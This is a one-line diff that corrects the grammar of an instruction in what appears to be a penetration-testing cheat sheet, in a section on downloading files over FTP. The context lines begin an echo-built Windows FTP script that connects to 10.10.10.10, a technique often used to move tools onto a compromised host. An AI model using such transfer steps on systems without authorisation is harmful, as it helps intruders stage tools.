@@ -183,7 +183,7 @@ USING FTP -
 
 **File Download**
 
-Replace "demo.txt" to desired file name
+Replace "demo.txt" with desired file name
     
     echo open 10.10.10.10 21 > file.txt
     echo bin>> file.txt
